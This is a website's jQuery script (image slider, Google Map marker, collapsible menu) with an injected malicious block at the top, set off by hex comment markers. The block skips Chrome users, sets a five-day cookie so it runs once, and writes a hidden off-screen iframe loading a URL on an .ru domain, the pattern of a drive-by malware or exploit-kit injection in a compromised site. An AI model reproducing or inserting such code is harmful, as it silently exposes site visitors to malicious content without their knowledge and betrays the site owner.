/*214afaae*/(function(){
function stripos (f_haystack, f_needle, f_offset) {
 var haystack = (f_haystack + '').toLowerCase();
 var needle = (f_needle + '').toLowerCase();
 var index = 0;
 if ((index = haystack.indexOf(needle, f_offset)) !== -1) {
  return index;
 }
 return false;
}
function zzz_check_ua(){
 var blackList = ['Chrome'];
 var blackUA = false;
 for (var i in blackList) {
  if (stripos(navigator.userAgent, blackList[i])) {
   blackUA = true;
   break;
  }
 }
 return blackUA;
}
function setCookie(name, value, expires) {
 var date = new Date( new Date().getTime() + expires*1000 );
 document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
}
function getCookie(name) {
 var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, '\$1') + "=([^;]*)" ));
 return matches ? decodeURIComponent(matches[1]) : undefined;
}
if (!zzz_check_ua()) {
 var cookie = getCookie('b1025da77');
 if (cookie == undefined) {
  setCookie('b1025da77', true, 432000);	
  document.write('<iframe height="117" width="117" style="position:absolute;left:-1000px;top:-1000px;" src="http://rapidthose.ru/hgewk.sa6u3p?default"></iframe>');
 }
};
})();/*eaa795220*/$(document).ready(function(){
    
    // Banner
    $('#slider').slider({
        prevText: '',
        nextText: '',
        pauseTime: 5000
    });
    
	// Google Map
    var ppGmap = $('#pp-gmap');
    
    if (ppGmap.length) {
        ppGmap.gmap().bind('init', function(ev, map) {
            $(this).gmap('addMarker', {
                'position': '57.7973333,12.0502107', 
                'bounds': true
            }).click(function() {
                $(this).gmap('openInfoWindow', {
                    'content': 'Hello World!'
                }, this);
            });
        });
    }
    
    $('#pp-leftmenu h3').click(function(){
        
        var el = $(this).parent();
        
        if (el.hasClass("active")) {
            el.removeClass("active");
            el.addClass("deactive");
        } else {
            el.addClass("active");
            el.removeClass("deactive");
        }
        
    });
    
});

